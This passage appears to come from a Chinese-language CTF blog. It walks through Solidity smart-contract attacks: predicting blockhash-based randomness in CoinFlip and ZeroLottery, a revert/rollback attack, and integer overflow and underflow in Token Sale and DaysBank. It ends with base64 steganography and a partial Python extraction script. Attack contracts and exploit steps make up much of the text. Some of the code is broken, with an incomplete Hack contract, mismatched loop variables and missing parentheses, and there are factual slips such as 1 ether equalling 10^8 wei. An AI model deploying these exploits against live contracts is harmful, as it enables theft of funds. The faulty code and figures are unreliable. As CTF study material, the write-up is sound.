class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.18;<br>contract CoinFlip &#123;<br>  uint256 public consecutiveWins;<br>  uint256 lastHash;<br>  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;<br><br>  function CoinFlip() public &#123;<br>    consecutiveWins = 0;<br>  &#125;<br><br>  function flip(bool _guess) public returns (bool) &#123;<br>    uint256 blockValue = uint256(block.blockhash(block.number-1));<br><br>    if (lastHash == blockValue) &#123;<br>      revert();<br>    &#125;<br><br>    lastHash = blockValue;<br>    uint256 coinFlip = blockValue / FACTOR;<br>    bool side = coinFlip == 1 ? true : false;<br><br>    if (side == _guess) &#123;<br>      consecutiveWins++;<br>      return true;<br>    &#125; else &#123;<br>      consecutiveWins = 0;<br>      return false;<br>    &#125;<br>  &#125;<br>&#125;<br>contract Hack&#123;<br>uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;<br>address instance=add;<br>CoinFlip c=CoinFlip(instance);<br>function attack()&#123;<br>    uint256 blockValue = uint256(block.blockhash(block.number.sub(1)));<br>    uint256 coinFlip = blockValue.div(FACTOR);<br>    bool side = coinFlip == 1 ? true : false;<br>    <br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>调用10次 attack() 即可。</p><h4 id="使用-Blockhash-的伪随机数"><a href="#使用-Blockhash-的伪随机数" class="headerlink" title="使用 Blockhash 的伪随机数"></a>使用 Blockhash 的伪随机数</h4><h5 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h5><p>Blockhash 是一个特殊的区块变量，EVM 只能获取到当前区块之前的 256 个区块的 blockhash （<strong>不含当前区块</strong>），对于这 256 个之外的区块返回 0。使用 blockhash 可能存在几种问题。</p><ol><li>误用，如 <code>block.blockhash(block.number)</code> 恒为零。</li><li>使用过去区块的有效 blockhash ，可以编写攻击合约获取相同值。</li><li>将猜数字和开奖的交易分开在两个不同区块中，并且使用猜数字时还不知道的某个区块的 blockhash 作为熵源，则可以等待 256 个区块后再进行开奖，消除 blockhash 的不确定性。</li></ol><h4 id="回滚攻击"><a href="#回滚攻击" class="headerlink" title="回滚攻击"></a>回滚攻击</h4><h5 id="原理-4"><a href="#原理-4" class="headerlink" title="原理"></a>原理</h5><p>在某些情况下，获取随机数可能过于困难或繁琐，这时可以考虑使用回滚攻击。回滚攻击的思想很简单：完全碰运气，输了就 “耍赖”，通过抛出异常使整个交易回滚不作数；赢的时候则不作处理，让交易被正常确认。</p><h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><p>0ctf final 2018 : ZeroLottery</p><p>Your goal is make your ZeroLottery’s balance &gt; 500. After that, you can get the flag at <a href="http://192.168.201.18:5000/flag?wallet=">http://192.168.201.18:5000/flag?wallet=</a> page.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.21;<br>contract ZeroLottery &#123;<br>    struct SeedComponents &#123;<br>        uint component1;<br>        uint component2;<br>        uint component3;<br>        uint component4;<br>    &#125;<br><br>    uint private base = 8;<br><br>    address private owner;<br>    mapping (address =&gt; uint256) public balanceOf;<br><br>    function ZeroLottery() public &#123;<br>        owner = msg.sender;<br>    &#125;<br>    <br>    function init() public payable &#123;<br>        balanceOf[msg.sender] = 100;<br>    &#125;<br><br>    function seed(SeedComponents components) internal pure returns (uint) &#123;<br>        uint secretSeed = uint256(keccak256(<br>            components.component1,<br>            components.component2,<br>            components.component3,<br>            components.component4<br>        ));<br>        return secretSeed;<br>    &#125;<br>    <br>    function bet(uint guess) public payable &#123;<br>        require(msg.value&gt;1 ether);<br>        require(balanceOf[msg.sender] &gt; 0);<br>        uint secretSeed = seed(SeedComponents((uint)(block.coinbase), block.difficulty, block.gaslimit, block.timestamp));<br>        uint n = uint(keccak256(uint(msg.sender), secretSeed)) % base;<br><br>        if (guess != n) &#123;<br>            balanceOf[msg.sender] = 0;<br>            // charge 0.5 ether for failure<br>            msg.sender.transfer(msg.value - 0.5 ether);<br>            return;<br>        &#125;<br>        // charge 1 ether for success<br>        msg.sender.transfer(msg.value - 1 ether);<br>        balanceOf[msg.sender] = balanceOf[msg.sender] + 100;<br>    &#125;<br><br>    function paolu() public payable &#123;<br>        require(msg.sender == owner);<br>        selfdestruct(owner);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>分析：</p><p>ZeroLottery()  定义owner；</p><p>init() 初始化余额为100；</p><p>seed() 定义生成随机数函数；</p><p>bet() 进行下注，猜对了扣除0.5，余额清零；猜对了扣除1 ether，余额加上100；</p><p>paolu() 用来销毁合约，只能合约的拥有者能调用；</p><p>本题的目标是余额为500代币。</p><h6 id="EXP1"><a href="#EXP1" class="headerlink" title="EXP1"></a>EXP1</h6><p>伪随机数攻击</p><p>block.coinbase, block.difficulty, block.gaslimit, block.timestamp来产生seed，因此区块变量是可以在本地计算出来的。</p><p>由于进行转账操作需要在攻击合约设置fallback函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.21;<br>contract Attack &#123;<br>    uint private base = 8;<br>    address owner;<br>    address targetAddr = 0xadd;<br>    constructor() payable&#123;<br>        owner=msg.sender;<br>        targetAddr.call(bytes4(keccak256(&quot;init()&quot;)));<br>    &#125;//传6eth<br>    function() payable external&#123;<br>        <br>    &#125;<br>    <br>    function hack() public &#123;<br>        uint secretSeed = uint256(keccak256(<br>            (uint)(block.coinbase), block.difficulty, block.gaslimit, block.timestamp<br>        ));<br>        uint n = uint(keccak256(uint(this), secretSeed)) % base;<br>        <br>        targetAddr.call.value(1.2 ether)(bytes4(keccak256(&quot;bet(uint256)&quot;)),n);<br>    &#125;<br>    function paolu() public payable &#123;<br>        selfdestruct(owner);<br>    &#125;<br>    function init() public &#123;<br>        targetAddr.call(bytes4(keccak256(&quot;init()&quot;)));<br>    &#125;<br>    <br>&#125;<br><br></code></pre></td></tr></table></figure><p>如果要求传的钱&gt;1 ether，而且猜完最多会退1ether，因此相当于一定会退钱回我们的攻击合约，攻击五次即可。</p><h6 id="EXP2"><a href="#EXP2" class="headerlink" title="EXP2"></a>EXP2</h6><p>回滚攻击</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function guess() public &#123;<br>    task.bet.value(2 ether)(1);<br>&#125;<br>function () public payable &#123;<br>    require(msg.value != 1.5 ether);<br>&#125;<br>//既然想要猜对，那么fallback函数必须要收到1.5ETH，我们可以设定一个固定的数进行尝试。<br></code></pre></td></tr></table></figure><p>同样可以利用循环：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.21;<br><br>contract Attack &#123;<br>    address addr = 0x21106c363469FA680115096c2Ae757B4586C2a75;<br>    address owner;<br>    constructor() payable &#123;<br>        owner = msg.sender;<br>        addr.call(bytes4(keccak256(&quot;init()&quot;)));<br>    &#125;<br>    function() payable external &#123;<br>        require(msg.value ==0.2 ether );<br>    &#125;<br>    function hack()&#123;<br>       for(uint conut=0;count&lt;5;count++)&#123;<br>           for(uint n=0;n&lt;8;n++)&#123;<br>                addr.call.value(1.2 ether (bytes4(keccak256(&quot;bet(uint256)&quot;)),n); <br>            &#125;<br>        &#125;<br>    &#125;<br>    function kill() public &#123;<br>        require(owner==msg.sender);<br>        selfdestruct(owner);<br>    &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>既然是失败是扣0.5，成功扣1eth，那么如果回退的钱数与失败的一样，那么就抛出异常。</p>]]></content>
      
      
      <categories>
          
          <category> Blockchain </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Attack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Integer Overflow and Underflow</title>
      <link href="/2023/10/21/Integer-Overflow-and-Underflow/"/>
      <url>/2023/10/21/Integer-Overflow-and-Underflow/</url>
      
        <content type="html"><![CDATA[<h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>EVM的整数有int和uint两种。</p><p>在 <code>Solidity</code> 语言中,变量支持的整数类型步长是以8递增的,从 <code>uint8</code> 到 <code>uint256</code>, <code>uint</code> 默认是 <code>uint256</code>,以 <code>uin8</code> 为例</p><p>我们知道 <code>uint8</code> 是8位,我们最多可以 <code>2**8-1</code>,也就是 255,若是256则会造成溢出,这是上溢</p><p>下溢也是一样的, <code>uint(0)-1</code> 就是255</p><h4 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h4><p>Capture The Ether 的 Token sale</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.21;<br><br>contract TokenSaleChallenge &#123;<br>    mapping(address =&gt; uint256) public balanceOf;<br>    uint256 constant PRICE_PER_TOKEN = 1 ether;<br><br>    function TokenSaleChallenge(address _player) public payable &#123;<br>        require(msg.value == 1 ether);<br>    &#125;<br><br>    function isComplete() public view returns (bool) &#123;<br>        return address(this).balance &lt; 1 ether;<br>    &#125;<br><br>    function buy(uint256 numTokens) public payable &#123;<br>        require(msg.value == numTokens * PRICE_PER_TOKEN);<br><br>        balanceOf[msg.sender] += numTokens;<br>    &#125;<br><br>    function sell(uint256 numTokens) public &#123;<br>        require(balanceOf[msg.sender] &gt;= numTokens);<br><br>        balanceOf[msg.sender] -= numTokens;<br>        msg.sender.transfer(numTokens * PRICE_PER_TOKEN);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>分析：<br>首先规定了合约中有1 ether，一个代币需要支付1 ether. 而isComplete()要求余额小于1 ether。 </p><p> buy(uint256 numTokens)函数则是msg.value &#x3D;&#x3D; numTokens * PRICE_PER_TOKEN。</p><p>再EVM里1ether&#x3D;10* *8 wei。然而EVM虚拟机最大只有256位即    2**256-1.因此只要我们的numTokens是一个很大的值，就会溢出。即我们花费不足1etner就买到了大量的代币，将一些代币卖出即可完成题目要求。</p><p>因此，我们可以购买2*<em>256&#x2F;&#x2F;10</em> *18+1 个代币就可以完成题目要求。</p><p>整数下溢</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract Bank &#123;<br>    mapping(address =&gt; uint256) public balanceOf;<br>    ...<br>    function withdraw(uint256 amount) public &#123;<br>        require(balanceOf[msg.sender] - amount &gt;= 0);<br>        balanceOf[msg.sender] -= amount;<br>        msg.sender.send.value(amount)();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>分析：</p><p>由于uint为无符号类型，因此</p><p>balanceOf[msg.sender] - amount &gt;&#x3D; 0看似没有任何问题，但是由于都是无符号类型，因此结果永远大于等于0的。所以我们可以任意取款。应改为balanceOf[msg.sender] &gt;&#x3D;amount</p><p>还有一种情况，与重入攻击有关：将1的物品卖出两次导致下溢为巨大的正数。</p><h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><h5 id="【ciscn2019】-Daysbank"><a href="#【ciscn2019】-Daysbank" class="headerlink" title="【ciscn2019】 Daysbank"></a>【ciscn2019】 Daysbank</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.24;<br><br>contract DaysBank &#123;<br>    mapping(address =&gt; uint) public balanceOf;<br>    mapping(address =&gt; uint) public gift;<br>    address owner;<br>        <br>    constructor()public&#123;<br>        owner = msg.sender;<br>    &#125;<br>    <br>    event SendFlag(uint256 flagnum, string b64email);<br>    function payforflag(string b64email) public &#123;<br>        require(balanceOf[msg.sender] &gt;= 10000);<br>        emit SendFlag(1,b64email);<br>    &#125;<br><br>    function getgift() public&#123;<br>        require(gift[msg.sender]==0);<br>        balanceOf[msg.sender]+=1;<br>        gift[msg.sender]=1;<br>    &#125;<br>    <br>    function transfer(address towhere, uint howmuch) public &#123;<br>        require(howmuch&gt;1);<br>        require(balanceOf[msg.sender]&gt;1);<br>        require(balanceOf[msg.sender]&gt;=howmuch);<br>        balanceOf[msg.sender]-=howmuch;<br>        balanceOf[towhere]+=howmuch;<br>    &#125;<br>    <br>    function profit() public&#123;<br>        require(balanceOf[msg.sender]==1);<br>        require(gift[msg.sender]==1);<br>        balanceOf[msg.sender]+=1;<br>        gift[msg.sender]=2;<br>    &#125;<br>    <br>    function transfer2(address towhere, uint howmuch) public &#123;<br>        require(howmuch&gt;2);<br>        require(balanceOf[msg.sender]&gt;2);<br>        require(balanceOf[msg.sender]-howmuch&gt;0);<br>        balanceOf[msg.sender]-=howmuch;<br>        balanceOf[towhere]+=howmuch;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>分析：</p><p>找到flag的函数payforflag（），观察得到，要想得到flag需要balanceof大于10w。</p><p>而transfer2（）函数中balanceOf[msg.sender]-howmuch&gt;0存在整数下溢的漏洞，因而可以利用。但是需要满足balanceOf[msg.sender]&gt;2的要求。</p><p>我们可以通过getgift()来获得一个代币，然后可以满足profit（）的要求，从而获得两个代币 ，此时balanceOf为2，gift为1。如果要达到balanceOf[msg.sender]&gt;2，那么需要利用transfer（）函数才能达到要求，transfer没有下溢的漏洞。</p><p>攻击过程：<br>先利用账号a，通过getgift()，然后利用profit（）函数，此时余额为2，gift为1.</p><p>然后再用账号b，重复该操作。</p><p>再将账号a利用transfer函数转给账号b两个代币。</p><p>然后再利用账号b调用transfer2转给账号a一个非常大的金额，达到溢出的效果，此时两个地址都可以执行flag函数。</p>]]></content>
      
      
      <categories>
          
          <category> Blockchain </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Attack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BASE64</title>
      <link href="/2023/10/20/BASE64/"/>
      <url>/2023/10/20/BASE64/</url>
      
        <content type="html"><![CDATA[<p>BASE64</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">ZG</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><br><span class="hljs-attribute">YY</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><br><span class="hljs-attribute">aW</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><br><span class="hljs-attribute">ZF</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><br><span class="hljs-attribute">cm</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><br><span class="hljs-attribute">aM</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><br><span class="hljs-attribute">b2</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><br><span class="hljs-attribute">dc</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><br><span class="hljs-attribute">c2</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><br><span class="hljs-attribute">Zf</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><br></code></pre></td></tr></table></figure><p>解码得到 daidrhouse，然而编码得到</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">ZA</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><br><span class="hljs-attribute">YQ</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><br><span class="hljs-attribute">aQ</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><br><span class="hljs-attribute">ZA</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><br><span class="hljs-attribute">cg</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><br><span class="hljs-attribute">aA</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><br><span class="hljs-attribute">bw</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><br><span class="hljs-attribute">dQ</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><br><span class="hljs-attribute">cw</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><br><span class="hljs-attribute">ZQ</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><br></code></pre></td></tr></table></figure><p>发现每一串的第二位都发生了改变，但是结果没变。</p><h4 id="base64原理"><a href="#base64原理" class="headerlink" title="base64原理"></a>base64原理</h4><p>顾名思义，base64编码就是用64个ascii字符作为基础来编码二进制内容的一种编码方式。相信各位一定在网页中看到过base64编码的内嵌图片，甚至QQ音乐传输歌词文件时，也采用了base64编码。将二进制编码为ascii字符，使数据在某些场景下更便于阅读、便于传输。当然，将所有二进制「浓缩」到区区64个字符来表示，一定会在体积上作出妥协。字符在编码完成后，会增大1&#x2F;3倍。</p><p>由于只用到了<strong>64个字符</strong>，所以使用6个二进制位(2^6 &#x3D; 64)完全可以把所有的字符表示出来，于是原来的1个字节8位在base64编码中变成了1个字节6位。</p><p>换言之：把原本的3个字节变成现在的4个字节，因为(<code>3*8 == 4*6</code>)</p><h4 id="索引表"><a href="#索引表" class="headerlink" title="索引表"></a>索引表</h4><p>base64有一张标准编码表，为64个ascii字符排序并赋予索引。</p><table><thead><tr><th align="left">索引</th><th align="left">字符</th><th align="left">索引</th><th align="left">字符</th><th align="left">索引</th><th align="left">字符</th><th align="left">索引</th><th align="left">字符</th></tr></thead><tbody><tr><td align="left">0</td><td align="left">A</td><td align="left">16</td><td align="left">Q</td><td align="left">32</td><td align="left">g</td><td align="left">48</td><td align="left">w</td></tr><tr><td align="left">1</td><td align="left">B</td><td align="left">17</td><td align="left">R</td><td align="left">33</td><td align="left">h</td><td align="left">49</td><td align="left">x</td></tr><tr><td align="left">2</td><td align="left">C</td><td align="left">18</td><td align="left">S</td><td align="left">34</td><td align="left">i</td><td align="left">50</td><td align="left">y</td></tr><tr><td align="left">3</td><td align="left">D</td><td align="left">19</td><td align="left">T</td><td align="left">35</td><td align="left">j</td><td align="left">51</td><td align="left">z</td></tr><tr><td align="left">4</td><td align="left">E</td><td align="left">20</td><td align="left">U</td><td align="left">36</td><td align="left">k</td><td align="left">52</td><td align="left">0</td></tr><tr><td align="left">5</td><td align="left">F</td><td align="left">21</td><td align="left">V</td><td align="left">37</td><td align="left">l</td><td align="left">53</td><td align="left">1</td></tr><tr><td align="left">6</td><td align="left">G</td><td align="left">22</td><td align="left">W</td><td align="left">38</td><td align="left">m</td><td align="left">54</td><td align="left">2</td></tr><tr><td align="left">7</td><td align="left">H</td><td align="left">23</td><td align="left">X</td><td align="left">39</td><td align="left">n</td><td align="left">55</td><td align="left">3</td></tr><tr><td align="left">8</td><td align="left">I</td><td align="left">24</td><td align="left">Y</td><td align="left">40</td><td align="left">o</td><td align="left">56</td><td align="left">4</td></tr><tr><td align="left">9</td><td align="left">J</td><td align="left">25</td><td align="left">Z</td><td align="left">41</td><td align="left">p</td><td align="left">57</td><td align="left">5</td></tr><tr><td align="left">10</td><td align="left">K</td><td align="left">26</td><td align="left">a</td><td align="left">42</td><td align="left">q</td><td align="left">58</td><td align="left">6</td></tr><tr><td align="left">11</td><td align="left">L</td><td align="left">27</td><td align="left">b</td><td align="left">43</td><td align="left">r</td><td align="left">59</td><td align="left">7</td></tr><tr><td align="left">12</td><td align="left">M</td><td align="left">28</td><td align="left">c</td><td align="left">44</td><td align="left">s</td><td align="left">60</td><td align="left">8</td></tr><tr><td align="left">13</td><td align="left">N</td><td align="left">29</td><td align="left">d</td><td align="left">45</td><td align="left">t</td><td align="left">61</td><td align="left">9</td></tr><tr><td align="left">14</td><td align="left">O</td><td align="left">30</td><td align="left">e</td><td align="left">46</td><td align="left">u</td><td align="left">62</td><td align="left">+</td></tr><tr><td align="left">15</td><td align="left">P</td><td align="left">31</td><td align="left">f</td><td align="left">47</td><td align="left">v</td><td align="left">63</td><td align="left">&#x2F;</td></tr></tbody></table><p>有时为了防止混淆（比如链接），会使用 <code>.</code> <code>_</code> 来代替索引表中的 <code>+</code> <code>/</code> 。</p><h4 id="隐写原理"><a href="#隐写原理" class="headerlink" title="隐写原理"></a>隐写原理</h4><p>base64在解码的时候，会按照字符串末尾的 <code>=</code> 数量来删除相应字节数。或许你已经发现了，当一组字符的数量为1字节或2字节的时候，会有4位或2位二进制在解码时被忽略</p><p><img src="/../images/NK23ZzryPj9YBpi-16977914930905.png" alt="NK23ZzryPj9YBpi"></p><p><img src="/../images/ZBpPwsz5OeaH3FG-16977914969667.png" alt="ZBpPwsz5OeaH3FG"></p><p>即解码时：</p><p>解密的时候首先把”&#x3D;”删去，然后写出二进制数串，然后从左往右每8位一组，剩余的不足8位丢掉，然后根据转换表获得相应字符</p><p>然后每8位一组，剩余不足的丢弃，</p><p>也就是说红色部分会被忽略，所以即使对其进行改变，解码得到的结果依然不变。</p><p>解密得到的明文是不变的，那么你重新按照正确的加密流程计算一遍，如果发现结果不一样，那么就说明隐藏进了信息。</p><p>CTF题目中出现一大堆base64编码字符串的时候，更需要考虑base64隐写。</p><p>base64的解密脚本</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> base64<br><br>b64chars = <span class="hljs-string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span><br><br><span class="hljs-comment"># ccc.txt为待解密的base64隐写字符串所在的文件</span><br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;base.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>)<br>base64str = f.readline()<br><br><span class="hljs-comment"># pattern2用于匹配两个等号情况时，等号前的一个字符</span><br><span class="hljs-comment"># pattern2用于匹配一个等号情况时，等号前的一个字符</span><br>pattern2 = <span class="hljs-string">r&#x27;(\S)==$&#x27;</span><br>pattern1 = <span class="hljs-string">r&#x27;(\S)=$&#x27;</span><br><br><span class="hljs-comment"># 提取后的隐写二进制字符加入binstring中</span><br>binstring = <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-comment"># 逐行读取待解密的base64隐写字符串，逐行处理</span><br><span class="hljs-keyword">while</span>(base64str):<br>    <span class="hljs-comment"># 先匹配两个等号的情况，如果匹配不上，再配置一个等号的情况</span><br>    <span class="hljs-comment"># 如果无等号，则没有隐藏，无需处理</span><br>    <span class="hljs-keyword">if</span> re.<span class="hljs-built_in">compile</span>(pattern2).findall(base64str):<br>        <span class="hljs-comment"># mstr为等号前的一个字符，该字符为隐写二进制信息所在的字符</span><br>        mstr = re.<span class="hljs-built_in">compile</span>(pattern2).findall(base64str)[<span class="hljs-number">0</span>]<br>        <span class="hljs-comment"># 确认mstr字符对应的base64二进制数，赋值给mbin</span><br>        mbin = <span class="hljs-built_in">bin</span>(b64chars.find(mstr))<br>        <span class="hljs-comment"># mbin格式如0b100，mbin[0:2]为0b</span><br>        <span class="hljs-comment"># mbin[2:].zfill(6)为将0b后面的二进制数前面补0，使0b后面的长度为6</span><br>        mbin2 = mbin[<span class="hljs-number">0</span>:<span class="hljs-number">2</span>] + mbin[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">6</span>)<br>        <span class="hljs-comment"># 